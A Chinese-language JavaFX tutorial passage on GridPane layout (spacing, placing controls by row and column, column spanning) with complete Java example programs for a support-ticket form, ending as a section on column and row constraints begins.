<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">GridPane</span> <span class="variable">gp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GridPane</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblTitle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Support Ticket&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblEmail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Email&quot;</span>);</span><br><span class="line"><span class="type">TextField</span> <span class="variable">tfEmail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblPriority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Priority&quot;</span>);</span><br><span class="line">ObservableList&lt;String&gt; priorities = FXCollections.observableArrayList(<span class="string">&quot;Medium&quot;</span>, <span class="string">&quot;High&quot;</span>, <span class="string">&quot;Low&quot;</span>);</span><br><span class="line">ComboBox&lt;String&gt; cbPriority = <span class="keyword">new</span> <span class="title class_">ComboBox</span>&lt;&gt;(priorities);</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblProblem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Problem&quot;</span>);</span><br><span class="line"><span class="type">TextField</span> <span class="variable">tfProblem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblDescription</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Description&quot;</span>);</span><br><span class="line"><span class="type">TextArea</span> <span class="variable">taDescription</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextArea</span>();</span><br></pre></td></tr></table></figure>
GridView有一个方便的方法`setGridLinesVisible()`，它可以显示网格结构和槽。 它在涉及跨越的更复杂的布局中特别有用，因为行/列分配中的间隙可能导致布局中的移动。
<img src="/image/Pasted image 20240501151429.png" alt="20240501151429.png" />
### 间距
作为一个容器，`GridPane`有一个padding属性，可以设置为用空白包围`GridPane`内容。 “padding”将接受一个`Inset`对象作为参数。 在这个例子中，10个像素的空白被应用到所有的边，所以一个简短的形式构造器被用于`Inset`。
在`GridPane`中，vgap和hgap控制沟槽。 hgap设置为4，以保持字段接近其值。 vgap稍微大一点，以帮助鼠标导航。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">gp.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10</span>) );</span><br><span class="line">gp.setHgap( <span class="number">4</span> );</span><br><span class="line">gp.setVgap( <span class="number">8</span> );</span><br></pre></td></tr></table></figure>
为了保持表单的下部一致，在VBox上设置了`Priority`。 但是，这不会调整单个行的大小。 对于单个调整大小规格，请使用`ColumnConstraints`和`RowConstraints`。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">VBox.setVgrow(gp, Priority.ALWAYS );</span><br></pre></td></tr></table></figure>
### 添加项目
与`BorderPane`或`HBox`等容器不同，节点需要指定它们在`GridPane`中的位置。 这是通过`add()`上的`GridPane`方法完成的，而不是容器子属性上的add方法。 这种形式的`GridPane``add()`方法采用从零开始的列位置和从零开始的行位置。 这段代码将两个语句放在同一行以提高可读性。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">gp.add( lblTitle,       <span class="number">1</span>, <span class="number">1</span>);  <span class="comment">// empty item at 0,0，按照网格坐标排版</span></span><br><span class="line">gp.add( lblEmail,       <span class="number">0</span>, <span class="number">2</span>); gp.add(tfEmail,        <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">gp.add( lblPriority,    <span class="number">0</span>, <span class="number">3</span>); gp.add( cbPriority,    <span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">gp.add( lblProblem,     <span class="number">0</span>, <span class="number">4</span>); gp.add( tfProblem,     <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">gp.add( lblDescription, <span class="number">0</span>, <span class="number">5</span>); gp.add( taDescription, <span class="number">1</span>, <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
lblTitle放在第一行的第二列。 第一行的第一列中没有条目。
随后的增加是成对的。 字段名`Label`对象放在第一列（列索引=0），值控件放在第二列（列索引=1）。 这些行由递增的第二个值相加。 例如，lblPriority与它的`ComboBox`一起放在沿着的第四行。
`GridPane`是JavaFX业务应用程序设计中的一个重要容器。 当您需要名称/值对时，`GridPane`将是支持传统表单的强列定向的简单方法。
### 完整代码
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.layout;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.collections.FXCollections;  </span><br><span class="line"><span class="keyword">import</span> javafx.collections.ObservableList;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Insets;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.*;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.GridPane;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.Priority;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.VBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line"><span class="keyword">import</span> org.scenicview.ScenicView;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GridPaneApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">GridPane</span> <span class="variable">gp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GridPane</span>();  </span><br><span class="line">        gp.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10</span>) );  </span><br><span class="line">        gp.setHgap( <span class="number">4</span> );  </span><br><span class="line">        gp.setVgap( <span class="number">8</span> );  </span><br><span class="line">  </span><br><span class="line">        VBox.setVgrow(gp, Priority.ALWAYS );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblTitle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Support Ticket&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblEmail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Email&quot;</span>);  </span><br><span class="line">        <span class="type">TextField</span> <span class="variable">tfEmail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblPriority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Priority&quot;</span>);  </span><br><span class="line">        ObservableList&lt;String&gt; priorities =  </span><br><span class="line">            FXCollections.observableArrayList(<span class="string">&quot;Medium&quot;</span>, <span class="string">&quot;High&quot;</span>, <span class="string">&quot;Low&quot;</span>);  </span><br><span class="line">        ComboBox&lt;String&gt; cbPriority = <span class="keyword">new</span> <span class="title class_">ComboBox</span>&lt;&gt;(priorities);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblProblem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Problem&quot;</span>);  </span><br><span class="line">        <span class="type">TextField</span> <span class="variable">tfProblem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblDescription</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Description&quot;</span>);  </span><br><span class="line">        <span class="type">TextArea</span> <span class="variable">taDescription</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextArea</span>();  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        gp.setGridLinesVisible(true);  </span></span><br><span class="line">  </span><br><span class="line">        gp.add( lblTitle,       <span class="number">1</span>, <span class="number">1</span>);  <span class="comment">// empty item at 0,0  </span></span><br><span class="line">        gp.add( lblEmail,       <span class="number">0</span>, <span class="number">2</span>); gp.add(tfEmail,        <span class="number">1</span>, <span class="number">2</span>);  </span><br><span class="line">        gp.add( lblPriority,    <span class="number">0</span>, <span class="number">3</span>); gp.add( cbPriority,    <span class="number">1</span>, <span class="number">3</span>);  </span><br><span class="line">        gp.add( lblProblem,     <span class="number">0</span>, <span class="number">4</span>); gp.add( tfProblem,     <span class="number">1</span>, <span class="number">4</span>);  </span><br><span class="line">        gp.add( lblDescription, <span class="number">0</span>, <span class="number">5</span>); gp.add( taDescription, <span class="number">1</span>, <span class="number">5</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Separator</span> <span class="variable">sep</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Separator</span>(); <span class="comment">// hr  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">ButtonBar</span> <span class="variable">buttonBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ButtonBar</span>();  </span><br><span class="line">        buttonBar.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10</span>) );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">saveButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Save&quot;</span>);  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">cancelButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Cancel&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        buttonBar.setButtonData(saveButton, ButtonBar.ButtonData.OK_DONE);  </span><br><span class="line">        buttonBar.setButtonData(cancelButton, ButtonBar.ButtonData.CANCEL_CLOSE);  </span><br><span class="line">  </span><br><span class="line">        buttonBar.getButtons().addAll(saveButton, cancelButton);  </span><br><span class="line">  </span><br><span class="line">        vbox.getChildren().addAll( gp, sep, buttonBar );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(vbox);  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;Grid Pane App&quot;</span>);  </span><br><span class="line">        primaryStage.setScene(scene);  </span><br><span class="line">        primaryStage.setWidth( <span class="number">736</span> );  </span><br><span class="line">        primaryStage.setHeight( <span class="number">414</span>  );  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">  </span><br><span class="line">        ScenicView.show(scene);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
## 网格跨越
对于使用`GridPane`实现的更复杂的表单，支持跨越。 跨越允许控件声明相邻列（colspan）和相邻行（rowspan）的空间。 这个屏幕截图显示了一个扩展了上一节中的示例的表单。 早期版本的两栏布局已被多栏布局取代。 Problem和Description等字段保留原始结构。 但是控件被添加到以前只包含电子邮件和优先级的行中。
<img src="/image/Pasted image 20240501153438.png" alt="20240501153438.png" />
打开轴网线时，请注意，前面的两列轴网线已替换为六列轴网线。 第三行包含六个项目-3个字段名/值对-指示结构。     表单的其余部分将使用跨度来填充空白。
此更新中使用的`VBox`和`GridPane`容器对象如下。 还有一点Vgap可以帮助用户选择`ComboBox`控件。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">GridPane</span> <span class="variable">gp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GridPane</span>();</span><br><span class="line">gp.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10</span>) );</span><br><span class="line">gp.setHgap( <span class="number">4</span> );</span><br><span class="line">gp.setVgap( <span class="number">10</span> );</span><br><span class="line"></span><br><span class="line">VBox.setVgrow(gp, Priority.ALWAYS );</span><br></pre></td></tr></table></figure>
这些是来自更新示例的控件创建语句。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Label</span> <span class="variable">lblTitle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Support Ticket&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblEmail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Email&quot;</span>);</span><br><span class="line"><span class="type">TextField</span> <span class="variable">tfEmail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblContract</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Contract&quot;</span>);</span><br><span class="line"><span class="type">TextField</span> <span class="variable">tfContract</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblPriority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Priority&quot;</span>);</span><br><span class="line">ObservableList&lt;String&gt; priorities =</span><br><span class="line">    FXCollections.observableArrayList(<span class="string">&quot;Medium&quot;</span>, <span class="string">&quot;High&quot;</span>, <span class="string">&quot;Low&quot;</span>);</span><br><span class="line">ComboBox&lt;String&gt; cbPriority = <span class="keyword">new</span> <span class="title class_">ComboBox</span>&lt;&gt;(priorities);</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblSeverity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Severity&quot;</span>);</span><br><span class="line">ObservableList&lt;String&gt; severities =</span><br><span class="line">    FXCollections.observableArrayList(<span class="string">&quot;Blocker&quot;</span>, <span class="string">&quot;Workaround&quot;</span>, <span class="string">&quot;N/A&quot;</span>);</span><br><span class="line">ComboBox&lt;String&gt; cbSeverity = <span class="keyword">new</span> <span class="title class_">ComboBox</span>&lt;&gt;(severities);</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblCategory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Category&quot;</span>);</span><br><span class="line">ObservableList&lt;String&gt; categories =</span><br><span class="line">    FXCollections.observableArrayList(<span class="string">&quot;Bug&quot;</span>, <span class="string">&quot;Feature&quot;</span>);</span><br><span class="line">ComboBox&lt;String&gt; cbCategory = <span class="keyword">new</span> <span class="title class_">ComboBox</span>&lt;&gt;(categories);</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblProblem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Problem&quot;</span>);</span><br><span class="line"><span class="type">TextField</span> <span class="variable">tfProblem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Label</span> <span class="variable">lblDescription</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Description&quot;</span>);</span><br><span class="line"><span class="type">TextArea</span> <span class="variable">taDescription</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextArea</span>();</span><br></pre></td></tr></table></figure>
与早期版本一样，使用`GridPane`方法将控件添加到`add()`。 指定了列和行。 在这个片段中，索引并不简单，因为有一些空白需要通过跨越内容来填充。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">gp.add( lblTitle,       <span class="number">1</span>, <span class="number">0</span>);  <span class="comment">// empty item at 0,0</span></span><br><span class="line"></span><br><span class="line">gp.add( lblEmail,       <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">gp.add(tfEmail,         <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">gp.add( lblContract,    <span class="number">4</span>, <span class="number">1</span> );</span><br><span class="line">gp.add( tfContract,     <span class="number">5</span>, <span class="number">1</span> );</span><br><span class="line"></span><br><span class="line">gp.add( lblPriority,    <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">gp.add( cbPriority,     <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">gp.add( lblSeverity,    <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">gp.add( cbSeverity,     <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">gp.add( lblCategory,    <span class="number">4</span>, <span class="number">2</span>);</span><br><span class="line">gp.add( cbCategory,     <span class="number">5</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">gp.add( lblProblem,     <span class="number">0</span>, <span class="number">3</span>); gp.add( tfProblem,     <span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">gp.add( lblDescription, <span class="number">0</span>, <span class="number">4</span>); gp.add( taDescription, <span class="number">1</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure>
最后，使用静态方法在`GridPane`上设置生成定义。 有一个类似的方法来做行跨越。 标题将占据5列，问题和描述也是如此。 电子邮件与合同共享一行，但将占用更多列。 ComboBoxes的第三行是一组三个字段/值对，每个字段/值对占据一列。
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GridPane.setColumnSpan( lblTitle, <span class="number">5</span> );</span><br><span class="line">GridPane.setColumnSpan( tfEmail, <span class="number">3</span> );</span><br><span class="line">GridPane.setColumnSpan( tfProblem, <span class="number">5</span> );</span><br><span class="line">GridPane.setColumnSpan( taDescription, <span class="number">5</span> );</span><br></pre></td></tr></table></figure>
或者，add（）方法的一个变体将columnSpan和rowSpan参数用于避免随后的静态方法调用。
这个扩展的`GridPane`示例演示了列跨越。 同样的功能也可用于行跨越，这将允许控件要求额外的垂直空间。 即使在给定行（或列）中的项数不同的情况下，跨度也会使控件保持对齐。 为了保持对跨主题的关注，这个网格允许列宽变化。 关于`ColumnConstraints`和`RowConstraints`的文章将重点关注通过更好地控制列（和行）来构建真正的模块化和列排版网格。
### 完整代码
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.layout;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.collections.FXCollections;  </span><br><span class="line"><span class="keyword">import</span> javafx.collections.ObservableList;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Insets;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.*;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.GridPane;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.Priority;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.VBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ComplexGridPaneApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">GridPane</span> <span class="variable">gp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GridPane</span>();  </span><br><span class="line">        gp.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10</span>) );  </span><br><span class="line">        gp.setHgap( <span class="number">4</span> );  </span><br><span class="line">        gp.setVgap( <span class="number">10</span> );  </span><br><span class="line">  </span><br><span class="line">        VBox.setVgrow(gp, Priority.ALWAYS );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblTitle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Support Ticket&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblEmail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Email&quot;</span>);  </span><br><span class="line">        <span class="type">TextField</span> <span class="variable">tfEmail</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblContract</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Contract&quot;</span>);  </span><br><span class="line">        <span class="type">TextField</span> <span class="variable">tfContract</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblPriority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Priority&quot;</span>);  </span><br><span class="line">        ObservableList&lt;String&gt; priorities =  </span><br><span class="line">            FXCollections.observableArrayList(<span class="string">&quot;Medium&quot;</span>, <span class="string">&quot;High&quot;</span>, <span class="string">&quot;Low&quot;</span>);  </span><br><span class="line">        ComboBox&lt;String&gt; cbPriority = <span class="keyword">new</span> <span class="title class_">ComboBox</span>&lt;&gt;(priorities);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblSeverity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Severity&quot;</span>);  </span><br><span class="line">        ObservableList&lt;String&gt; severities = FXCollections.observableArrayList(<span class="string">&quot;Blocker&quot;</span>, <span class="string">&quot;Workaround&quot;</span>, <span class="string">&quot;N/A&quot;</span>);  </span><br><span class="line">        ComboBox&lt;String&gt; cbSeverity = <span class="keyword">new</span> <span class="title class_">ComboBox</span>&lt;&gt;(severities);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblCategory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Category&quot;</span>);  </span><br><span class="line">        ObservableList&lt;String&gt; categories = FXCollections.observableArrayList(<span class="string">&quot;Bug&quot;</span>, <span class="string">&quot;Feature&quot;</span>);  </span><br><span class="line">        ComboBox&lt;String&gt; cbCategory = <span class="keyword">new</span> <span class="title class_">ComboBox</span>&lt;&gt;(categories);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblProblem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Problem&quot;</span>);  </span><br><span class="line">        <span class="type">TextField</span> <span class="variable">tfProblem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Label</span> <span class="variable">lblDescription</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;Description&quot;</span>);  </span><br><span class="line">        <span class="type">TextArea</span> <span class="variable">taDescription</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextArea</span>();  </span><br><span class="line">  </span><br><span class="line">        gp.add( lblTitle,       <span class="number">1</span>, <span class="number">0</span>);  <span class="comment">// empty item at 0,0  </span></span><br><span class="line">  </span><br><span class="line">        gp.add( lblEmail,       <span class="number">0</span>, <span class="number">1</span>);  </span><br><span class="line">        gp.add(tfEmail,         <span class="number">1</span>, <span class="number">1</span>);  </span><br><span class="line">        gp.add( lblContract,    <span class="number">4</span>, <span class="number">1</span> );  </span><br><span class="line">        gp.add( tfContract,     <span class="number">5</span>, <span class="number">1</span> );  </span><br><span class="line">  </span><br><span class="line">        gp.add( lblPriority,    <span class="number">0</span>, <span class="number">2</span>);  </span><br><span class="line">        gp.add( cbPriority,     <span class="number">1</span>, <span class="number">2</span>);  </span><br><span class="line">        gp.add( lblSeverity,    <span class="number">2</span>, <span class="number">2</span>);  </span><br><span class="line">        gp.add( cbSeverity,     <span class="number">3</span>, <span class="number">2</span>);  </span><br><span class="line">        gp.add( lblCategory,    <span class="number">4</span>, <span class="number">2</span>);  </span><br><span class="line">        gp.add( cbCategory,     <span class="number">5</span>, <span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">        gp.add( lblProblem,     <span class="number">0</span>, <span class="number">3</span>); gp.add( tfProblem,     <span class="number">1</span>, <span class="number">3</span>);  </span><br><span class="line">        gp.add( lblDescription, <span class="number">0</span>, <span class="number">4</span>); gp.add( taDescription, <span class="number">1</span>, <span class="number">4</span>);  </span><br><span class="line">  </span><br><span class="line">        GridPane.setColumnSpan( lblTitle, <span class="number">5</span> );  </span><br><span class="line">        GridPane.setColumnSpan( tfEmail, <span class="number">3</span> );  </span><br><span class="line">        GridPane.setColumnSpan( tfProblem, <span class="number">5</span> );  </span><br><span class="line">        GridPane.setColumnSpan( taDescription, <span class="number">5</span> );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Separator</span> <span class="variable">sep</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Separator</span>(); <span class="comment">// hr  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">ButtonBar</span> <span class="variable">buttonBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ButtonBar</span>();  </span><br><span class="line">        buttonBar.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10</span>) );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">saveButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Save&quot;</span>);  </span><br><span class="line">        <span class="type">Button</span> <span class="variable">cancelButton</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;Cancel&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        buttonBar.setButtonData(saveButton, ButtonBar.ButtonData.OK_DONE);  </span><br><span class="line">        buttonBar.setButtonData(cancelButton, ButtonBar.ButtonData.CANCEL_CLOSE);  </span><br><span class="line">  </span><br><span class="line">        buttonBar.getButtons().addAll(saveButton, cancelButton);  </span><br><span class="line">  </span><br><span class="line">        vbox.getChildren().addAll( gp, sep, buttonBar );  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(vbox);  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;Grid Pane App&quot;</span>);  </span><br><span class="line">        primaryStage.setScene(scene);  </span><br><span class="line">        primaryStage.setWidth( <span class="number">736</span> );  </span><br><span class="line">        primaryStage.setHeight( <span class="number">414</span>  );  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
## 网格列约束和行约束
上一篇文章介绍了如何创建一个两列布局，字段名称在左侧，字段值在右侧。 该示例已扩展为向给定行添加更多控件，并在内容中使用跨越句柄间隙。 本文介绍了一对JavaFX类`GridPane`和`ColumnConstraints`。 这些类给予对行或列的附加说明。 在这个例子中，当窗口调整大小时，包含`RowConstraints`的行将被给予所有额外的空间。 这两列将被设置为宽度相等。
这个屏幕截图显示了一个从以前的文章修改的示例。 本文的演示程序有一种旋转的感觉，即字段名与字段值垂直配对（在值的顶部），而不是水平配对。 跨行和跨列用于对齐大于单个单元格的项。
<img src="/image/Pasted image 20240501154341.png" alt="20240501154341.png" />
这段代码创建了`Scene`根和`GridPane`对象。
